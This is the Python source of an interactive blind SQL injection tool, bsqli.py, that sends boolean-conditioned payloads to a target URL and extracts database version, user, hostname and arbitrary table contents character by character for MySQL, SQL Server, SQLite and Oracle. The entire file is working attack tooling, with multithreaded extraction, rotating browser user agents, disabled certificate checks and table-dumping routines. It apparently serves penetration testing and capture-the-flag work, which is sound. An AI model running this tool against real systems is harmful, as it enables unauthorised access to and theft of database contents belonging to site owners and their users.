#!/usr/bin/env python3
# Boolean-based Blind SQLi tool by TrebledJ.
# Help: python bsqli.py -h
# Docs: https://github.com/TrebledJ/bsqli.py

import sys
from urllib.parse import quote_plus, quote
import urllib3
from urllib3.util import Retry
import time
from typing import *
import logging
import math
import argparse
import concurrent.futures
from enum import Enum
from dataclasses import dataclass, field
import copy
import random

try:
    import requests
    from rich.progress import *
    from prompt_toolkit import prompt, PromptSession
    from prompt_toolkit.history import FileHistory
except ImportError as e:
    print(e)
    print('Make sure you have the necessary packages:')
    print('\tpip install requests rich prompt_toolkit')
    sys.exit(1)


VERSION = '0.5.5'

logging.basicConfig(format='[%(levelname)s] %(message)s')
urllib3.disable_warnings()
console = Console()

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.3',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.3',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.3',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edge/124.0.0.',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36 Avast/109.0.24252.12',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36',
]

DEFAULT_HEADERS = {
    'User-Agent': random.choice(USER_AGENTS),
    'Cache-Control': 'no-cache',
}

class prompts:
    main = PromptSession(history=FileHistory(".main.prompt.history"))
    table = PromptSession(history=FileHistory(".table.prompt.history"))
    column = PromptSession(history=FileHistory(".column.prompt.history"))


class FormatMinimal(dict):
    def __missing__(self, key): 
        return key.join("{}")

class Palette:
    primary: str = 'blue'
    highlight: str = 'cyan'


@dataclass
class SQLPayload:
    vector: str # Unfinished full SQL payload possibly containing parameters.

    @abstractmethod
    def construct(self, params: dict) -> str:
        """Returns the complete SQL payload."""
        return self.vector.format_map(FormatMinimal(params))


@dataclass
class ResultError:
    reason: str


class ResultParser:
    @abstractmethod
    def parse(self, resp) -> Any | ResultError:
        ...


@dataclass(kw_only=True)
class BooleanResultParser(ResultParser):
    true_if_status: Optional[int] = None
    true_if_not_status: Optional[int] = None
    true_if_text_contains: Optional[str] = None
    true_if_text_not_contains: Optional[str] = None

    error_if_status: List[int] = field(default_factory=list)
    error_if_text_contains: List[str] = field(default_factory=list)
    error_if_text_not_contains: List[str] = field(default_factory=list)

    def parse(self, resp) -> bool | ResultError:
        if resp.status_code in self.error_if_status:
            return ResultError(f'status code: {resp.status_code}')
        for t in self.error_if_text_contains:
            if t in resp.text:
                return ResultError(f'text contains: {t}')
        for t in self.error_if_text_not_contains:
            if t not in resp.text:
                return ResultError(f'text missing: {t}')
        
        if self.true_if_status is not None:
            return resp.status_code == self.true_if_status
        if self.true_if_not_status is not None:
            return resp.status_code != self.true_if_not_status
        if self.true_if_text_contains is not None:
            return self.true_if_text_contains in resp.text
        if self.true_if_text_not_contains is not None:
            return self.true_if_text_not_contains not in resp.text
        return resp.status_code != '404'


def make_session(max_retries: int, proxy: Optional[str]) -> requests.Session:
    s = requests.Session()
    # https://urllib3.readthedocs.io/en/stable/reference/urllib3.util.html#urllib3.util.Retry
    retries = Retry(
        connect=max_retries,
        read=1,
        redirect=0,
        backoff_factor=0.2,
    )
    pool_size = 100
    adapter = requests.adapters.HTTPAdapter(max_retries=retries, pool_connections=pool_size, pool_maxsize=pool_size)
    s.mount('http://', adapter)
    s.mount('https://', adapter)
    if proxy is not None:
        s.proxies.update({
            'http': proxy,
            'https': proxy
        })
    return s


PAYLOAD_TOKEN = '{payload}'
COND_TOKEN = '{cond}'

@dataclass(kw_only=True)
class Sender:
    url: str
    method: Literal["GET"] | Literal["POST"]
    payload: SQLPayload
    data: Optional[str] = None

    # Request settings.
    headers: Dict
    timeout: int = 5
    allow_redirects: bool = False
    # keep_alive: bool = False
    
    session: requests.Session = None
    
    retries_on_error: int = 0   # Number of retries if a response was marked as an error.

    result_parser: ResultParser

    def send(self, **payload_params) -> Any:
        # sender.send(cond='1=1')
        url, data = self.make_payload(payload_params)

        logging.debug(f'requesting...')
        # logging.debug(f' | payload   : {quoted_payload}')
        logging.debug(f' | url       : {self.url}')
        logging.debug(f' | data      : {self.data}')
        
        for attempt in range(self.retries_on_error + 1):
            try:
                resp = self.make_request(url, data)
                # print('status code:', resp.status_code, f'   text: {len(resp.text)}c')
            except ConnectionError as e:
                raise e
            
            result = self.result_parser.parse(resp)
            if isinstance(result, ResultError):
                logging.info(f'error encountered: {result.reason}')
                logging.info(f'retrying... ({attempt+1} / {self.retries_on_error+1})')
            else:
                return result

    def make_payload(self, payload_params: dict):
        url, data = self.url, self.data
        
        if PAYLOAD_TOKEN in url:
            raw_payload = self.payload.construct(payload_params)
            quoted_payload = quote_plus(raw_payload)
            url = url.format_map(FormatMinimal(payload=quoted_payload))
        elif data and PAYLOAD_TOKEN in data:
            raw_payload = self.payload.construct(payload_params)
            quoted_payload = quote(raw_payload)
            data = data.format_map(FormatMinimal(payload=quoted_payload))
        elif COND_TOKEN in url:
            # PAYLOAD_TOKEN is not found. Substitute COND_TOKEN directly.
            url = url.format_map(FormatMinimal(**payload_params))
        elif data and COND_TOKEN in data:
            # PAYLOAD_TOKEN is not found. Substitute COND_TOKEN directly.
            data = data.format_map(FormatMinimal(**payload_params))
        else:
            raise RuntimeError('payload token not found')
        
        return url, data
    
    def make_request(self, url, data):
        return self.session.request(self.method, url, data=data,
                                timeout=self.timeout,
                                verify=False,
                                headers=self.headers,
                                allow_redirects=self.allow_redirects)
        

class DBMS(str, Enum):
    MySQL = "MySQL"
    SQLServer = "SQLServer"
    SQLite = "SQLite"
    OracleSQL = "OracleSQL"
    def __str__(self):
        return self.value


class SQLVariant:
    version = '@@version'
    ascii = 'ASCII'
    substring = 'SUBSTRING' # Basic function SUBSTRING(str, pos, len).
    length = 'LENGTH'

class SQLiteVariant(SQLVariant):
    version = 'sqlite_version()'
    current_user = "'no user'"
    ascii = 'UNICODE'
    

class MySQLVariant(SQLVariant):
    current_user = 'current_user()'
    database_name = 'database()'
    server_name = '@@hostname'
    host_name = '@@hostname'

class SQLServerVariant(SQLVariant):
    current_user = 'current_user'
    database_name = 'db_name()'
    server_name = '@@servername'
    host_name = 'host_name()'
    length = 'LEN'
    
class OracleSQLVariant(SQLVariant):
    version = '(select banner from v$version where rownum = 1)'
    current_user = 'current_user'
    database_name = None
    server_name = None
    host_name = None
    substring = 'SUBSTR'


variant_class = {
    DBMS.MySQL: MySQLVariant,
    DBMS.SQLServer: SQLServerVariant,
    DBMS.SQLite: SQLiteVariant,
    DBMS.OracleSQL: OracleSQLVariant,
}


@dataclass
class SQLStringBrute:
    sender: Sender
    prog: Progress
    dbms: DBMS
    max_threads: int

    def get_by_bsearch(self, sql: str, min: int, max: int, *, index: Optional[int]=None, task=None):
        """
        Search for the value of a query within a numeric range: [min, max).
        The query should return one integer.
        For strings, use ASCII(SUBSTRING(s, offset, 1)).
        """
        # prev = None  # Previous guess.

        if not self.sender.send(cond=f'{sql}<{max}'):
            # Not even within range?
            return None
        
        if self.sender.send(cond=f'{sql}<{min}'):
            return None

        while min < max:
            mid = (min + max) // 2
            
            if mid == min:
                return mid

            if task is not None:
                self.prog.update(task, value=mid, advance=1)
            
            if index is None:
                logging.debug(f'length: {mid}')
            else:
                logging.debug(f'{index}: {mid}')


            if self.sender.send(cond=f'{sql}<{mid}'):
                # Len is upper bound.
                max = mid
            else:
                min = mid
            # prev = mid
            
        return None


    def get_length(self, sql, max_len=2048, *, task=None):
        sql = f'{getattr(variant_class[self.dbms], "length")}(({sql}))'
        return self.get_by_bsearch(sql, 0, max_len, task=task)


    @staticmethod
    def format_bytes(xs: bytes) -> bytes:
        return b"".join(xs)

    @staticmethod
    def preview_bytes(xs: bytes) -> bytes | str:
        bs = b"".join(xs)[:40]
        try:
            return bs.decode()
        except:
            return bs


    def get_string(self, sql):
        with self.prog:
            max_len = 2048
            task = self.prog.add_task("[green]measuring...", value=str(max_len), total=int(math.log(max_len, 2)+1))
            try:
                length = self.get_length(sql, task=task)
            except KeyboardInterrupt as e:
                self.prog.remove_task(task)
                raise e # Re-raise to exit to main loop.
               
            self.prog.remove_task(task)

        if length is None:
            logging.warning(f"unable to get length of {sql}")
            return ''

        logging.info(f"result length: {length}")

        result_chars = [b'?'] * length


        def on_index_finished(task, idx):
            # self.prog.update doesn't check if the task is in available tasks.
            # This may be an issue if we interrupted multithreading and some were just finishing.
            if task in self.prog.task_ids:
                self.prog.update(task, value=SQLStringBrute.preview_bytes(result_chars), advance=1, refresh=True)

        variant = variant_class[self.dbms]
        ASCII = getattr(variant, 'ascii')
        SUBSTRING = getattr(variant, 'substring')

        with self.prog:
            init_value = SQLStringBrute.preview_bytes(result_chars)
            task = self.prog.add_task("[green]inspecting...", value=init_value, total=length)

            try:
                # Start threads.
                with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                    future_map = {}

                    # Create threads and on-complete handlers.
                    for idx in range(length):
                        f = executor.submit(self.get_by_bsearch, f"{ASCII}({SUBSTRING}(({sql}),{idx+1},1))", 0, 128, index=idx)
                        f.add_done_callback(lambda f: on_index_finished(task, idx))
                        future_map[f] = idx

                    for future in concurrent.futures.as_completed(future_map):
                        idx = future_map[future]
                        try:
                            ch = future.result()
                            if ch is not None:
                                result_chars[idx] = bytes([ch])
                        except Exception as exc:
                            logging.warning(f'{idx} generated an exception: {type(exc)} {exc}')
                        else:
                            if logging.getLogger().getEffectiveLevel() <= logging.INFO:
                                self.prog.console.log(f"str[{idx}] = {result_chars[idx]} ({ch})")
                                
            except KeyboardInterrupt:
                print('Received KeyboardInterrupt while multi-threading.')
                print('Cleaning up...')
            
            self.prog.remove_task(task)
        
        return SQLStringBrute.format_bytes(result_chars)

    def get_number(self, sql):
        with self.prog:
            max_n = 32768
            task = self.prog.add_task("[green]measuring...", value=str(max_n), total=int(math.log(max_n, 2)+1))
            try:
                num = self.get_by_bsearch(sql, min=0, max=max_n, task=task)
            except KeyboardInterrupt as e:
                self.prog.remove_task(task)
                raise e # Re-raise to exit to main loop.
               
            self.prog.remove_task(task)

        return str(num)


@dataclass
class SQLOptions:
    cast_to_string: bool
    cast_to_string_length: int


@dataclass
class Query:
    brute: SQLStringBrute
    variant: SQLVariant
    options: SQLOptions

    def query(self, sql, info='information'):
        console.print(f"(+) retrieving {info}...")
        start = time.time()

        if 'count' in sql[:40].lower():
            print('Detected `count` query. Switching to (faster) numeric brute.')
            res = self.brute.get_number(f'({sql})')
        else:
            if self.options.cast_to_string:
                cast_len = self.options.cast_to_string_length
                match self.brute.dbms:
                    case DBMS.MySQL | DBMS.SQLite:
                        res = self.brute.get_string(f'cast(({sql}) as char({cast_len}))')
                    case DBMS.SQLServer:
                        res = self.brute.get_string(f'cast(({sql}) as varchar({cast_len}))')
                    case DBMS.OracleSQL:
                        res = self.brute.get_string(f'cast(({sql}) as varchar({cast_len}))')
                    case _:
                        print('Warning: cast-to-string has not been implemented for the specified DBMS. Defaulting to normal brute.')
                        res = self.brute.get_string(f'{sql}')
            else:
                res = self.brute.get_string(f'{sql}')

        end = time.time()

        try:
            res = res.decode()
        except:
            pass

        if res.strip():
            console.print(res, style=Palette.primary)
        else:
            console.print('empty result', style='yellow')
        
        console.print(f'Queries finished in {end - start:.1f}s', style=Palette.highlight)

    def special(self, shorthand):
        if hasattr(self.variant, shorthand):
            sql = getattr(self.variant, shorthand)
            self.query(sql, info=shorthand.replace('_', ' '))
        else:
            raise NotImplementedError(f"unknown shorthand '{shorthand}' for dbms {self.brute.dbms}")

    def query_table(self, table, col):
        # is_notbased = (id_col.strip() == '')

        match self.brute.dbms:
            case DBMS.MySQL | DBMS.SQLite:
                sql = 'select {col} from {table}{where_clause} limit 1'
            case DBMS.SQLServer:
                sql = 'select top 1 {col} from {table}{where_clause}'
            case DBMS.OracleSQL:
                sql = 'select {col} from {table} where rownum=1'
            case _:
                raise NotImplementedError()

        i = 0
        entries = []
        while True:
            console.print(f'(+) retrieving entry #{i+1}')
            params = dict(table=table, col=col, where_clause='')
            # if is_notbased:
            if entries:
                array = ",".join(f"'{x}'" for x in entries)
                params.update(where_clause=f' where {col} not in ({array})')

            name = self.brute.get_string(sql.format_map(FormatMinimal(params)))
            # else:
            #     name = self.brute.get_string(f'select {col} from {table} where {id_col}={i+1}', max_threads)
            if not name.strip():
                break

            try:
                name = name.decode()
            except:
                pass

            console.print(f'entry [bold]#{i+1}[/bold]: {name}', style=Palette.primary)
            entries.append(name)
            i += 1

        ans = prompt(f'Print all ({len(entries)}) entries? [Y/n]')
        if not ans.strip() or ans.lower().startswith('y'):
            print(table)
            print('-'*20)
            print('\n'.join(entries))
        else:
            print('\n'.join(entries[:5]))


def make_headers(args):
    headers = copy.copy(DEFAULT_HEADERS)
    
    # Add headers from args.
    for h in args.header:
        k, v = h.split(':', 1)
        headers[k.strip()] = v.strip()

    if args.data and 'Content-Type' not in headers:
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
    
    # if args.keep_alive:
    #     headers['Connection'] = 'keep-alive'
    # else:
    #     headers['Connection'] = 'close'
    
    return headers


class Formatter(argparse.RawDescriptionHelpFormatter, argparse.ArgumentDefaultsHelpFormatter):
    pass


def main():
    global PAYLOAD_TOKEN, COND_TOKEN

    parser = argparse.ArgumentParser(description=f'Boolean-based Blind SQLi tool by TrebledJ.', formatter_class=Formatter)
    
    parser.add_argument('-V', '--version', action='store_true', help='Print script version')

    parser.add_argument('-u', '--url', 
                        help='The url to scan, with the scheme (e.g. http://192.168.1.1/admin). Possibly containing an injection point marked with `{payload}`.')
    parser.add_argument('--data', default='',
                        help='Url-encoded data to send with the request. Possibly containing an injection point marked with `{payload}`.')
    
    parser.add_argument('-X', '--method', choices=["GET", "POST"], default='GET', help='GET or POST')
    parser.add_argument('-H', '--header', action='append', default=[], help='Extra headers to send with requests.')
    parser.add_argument('--timeout', default=5, type=int, help='Timeout of each request.')
    parser.add_argument('--payload', help='The SQLi payload.')

    parser.add_argument('--proxy', default=None, help='Send requests to a proxy. Example: http://127.0.0.1:8080.')
    parser.add_argument('--follow-redirects', action='store_true', help='Follows redirects in responses.')
    # parser.add_argument('--keep-alive', action='store_true', help='Enables `Connection: keep-alive`.')
    parser.add_argument('--max-retries', default=3, type=int, help='Maximum number of HTTP connection retries to attempt.')

    parser.add_argument('--dbms', choices=[DBMS.MySQL, DBMS.SQLServer, DBMS.SQLite, DBMS.OracleSQL], help='The database management system.')
    parser.add_argument('--strategy', choices=["B"], default='B',
                        help='The strategy to use: Boolean. You don\'t have any other choice at this moment.')
    parser.add_argument('-t', '--threads', default=8, type=int, help='Number of threads to use.')
    parser.add_argument('-v', action='count', default=0, help='Verbosity. -v for INFO, -vv for DEBUG messages.')

    parser.add_argument('-bts', '--boolean-true-if-status', type=int,
                        help='If the response returns the provided status, mark the response as TRUE. All other statuses are FALSE.')
    parser.add_argument('-bfs', '--boolean-false-if-status', type=int,
                        help='If the response returns the provided status, mark the response as FALSE. All other statuses are TRUE.')
    parser.add_argument('-bttc', '--boolean-true-if-text-contains',
                        help='If the response text contains the provided text, mark the response as TRUE. Otherwise, FALSE.')
    parser.add_argument('-bftc', '--boolean-false-if-text-contains',
                        help='If the response text contains the provided text, mark the response as FALSE. Otherwise, TRUE.')

    parser.add_argument('-bes', '--boolean-error-if-status', action='append', default=[],
                        help='If the provided statuses are encountered, mark the query as an error. Accepts multiple arguments (e.g. -bes 400, -bes 401).')
    parser.add_argument('-betc', '--boolean-error-if-text-contains', action='append', default=[],
                        help='If the provided text is encountered in the response body, mark the query as an error. Accepts multiple arguments.')
    parser.add_argument('-betn', '--boolean-error-if-text-not-contains', action='append', default=[],
                        help='If the provided text was NOT encountered in the response body, mark the query as an error. Accepts multiple arguments.')
    parser.add_argument('--max-retries-on-error', type=int, default=3,
                        help='Maximum number of retries if a response is marked as an error.')
    
    parser.add_argument('--cast-to-string', action='store_true',
                        help='Cast the target output to varchar(2048) string. This allows numbers and other data types to be treated as strings, so that our standard ASCII-SUBSTRING algorithm can work.')
    parser.add_argument('--cast-to-string-length', default=2048, type=int,
                        help='The length of the string to cast to. If you specify this, you should also enable --cast-to-string.')
    
    # TODO: unicode support
    # TODO: improve table enumeration
    
    # Primary console colour.
    parser.add_argument('--color-primary', default=Palette.primary, help=argparse.SUPPRESS)
    # Highlight console colour.
    parser.add_argument('--color-highlight', default=Palette.highlight, help=argparse.SUPPRESS)
    
    args = parser.parse_args()

    if args.version:
        print(VERSION)
        return

    if args.url is None:
        parser.print_help()
        return 1
    
    match args.v:
        case 0:
            logging.getLogger().setLevel(logging.WARNING)
        case 1:
            logging.getLogger().setLevel(logging.INFO)
        case _:
            logging.getLogger().setLevel(logging.DEBUG)
            
    # PAYLOAD_TOKEN = args.payload_token
    # COND_TOKEN = args.cond_token
    Palette.primary = args.color_primary
    Palette.highlight = args.color_highlight
    
    assert args.url.startswith('http://') or args.url.startswith('https://'), 'Expected URL to start with http:// or https://.'
    assert args.max_retries_on_error >= 0, 'Retries on error should be non-negative.'
    assert args.dbms is not None, 'Expected DBMS parameter. Please specify the DBMS with --dbms.'

    console.print()
    console.print('-- @TrebledJ/bsqli.py --', style=Palette.primary)
    console.print(f'{"v" + VERSION:->22}--', style=Palette.primary, highlight=False)

    match args.strategy:
        case "B":
            parser = BooleanResultParser(
                true_if_status=args.boolean_true_if_status,  
                true_if_not_status=args.boolean_false_if_status,  
                true_if_text_contains=args.boolean_true_if_text_contains,  
                true_if_text_not_contains=args.boolean_false_if_text_contains,
                error_if_status=args.boolean_error_if_status,
                error_if_text_contains=args.boolean_error_if_text_contains,
                error_if_text_not_contains=args.boolean_error_if_text_not_contains,
            )
        case _:
            raise NotImplementedError()
        
    sender = Sender(
        url=args.url,
        method=args.method,
        payload=SQLPayload(args.payload),
        headers=make_headers(args),
        data=args.data,
        timeout=args.timeout,
        allow_redirects=args.follow_redirects,
        session=make_session(args.max_retries, args.proxy),
        retries_on_error=args.max_retries_on_error,
        result_parser=parser,
    )

    brute = SQLStringBrute(
        sender=sender,
        prog=Progress(
            TextColumn(f"[bold {Palette.primary}]{{task.fields[value]}}"),
            *Progress.get_default_columns(),
            transient=True
        ),
        dbms=args.dbms,
        max_threads=args.threads,
    )
    
    sql_options = SQLOptions(
        cast_to_string=args.cast_to_string,
        cast_to_string_length=args.cast_to_string_length,
    )
    
    query = Query(brute, variant=variant_class[args.dbms], options=sql_options)

    while 1:
        try:
            sql = prompts.main.prompt("sqli> ")
        except KeyboardInterrupt:
            continue
        except EOFError:
            print('Exiting...')
            break
        
        try:
            match sql:
                case "q":
                    print("Use 'quit' if you're sure you want to quit.")
                case "quit":
                    break
                case "help":
                    print("Help menu hasn't been implemented yet.")
                case "v":
                    query.special('version')
                case "u":
                    query.special('current_user')
                case "d":
                    query.special('database_name')
                case "h":
                    query.special('host_name')
                case "s":
                    query.special('server_name')
                case "t":
                    table = prompts.table.prompt('table> ')
                    col = prompts.column.prompt('col> ')
                    query.query_table(table, col)
                case "":
                    continue
                case _:
                    query.query(sql)
        except KeyboardInterrupt:
            print("Received KeyboardInterrupt during enumeration.")

try:
    rc = main()
except AssertionError as e:
    print()
    print(e)
    sys.exit(1)
    
sys.exit(rc if rc else 0)
